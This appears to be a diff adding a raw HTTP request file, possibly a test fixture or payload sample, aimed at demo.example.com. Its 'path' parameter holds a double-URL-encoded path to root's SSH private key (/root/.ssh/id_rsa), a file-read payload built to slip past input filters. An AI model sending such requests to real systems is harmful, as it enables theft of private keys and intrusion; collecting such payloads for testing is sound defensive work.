@@ -1,0 +1,4 @@
+GET /a?path=%252Froot%252F.ssh%252Fid_rsa HTTP/1.1
+Host: demo.example.com
+Connection: close
+
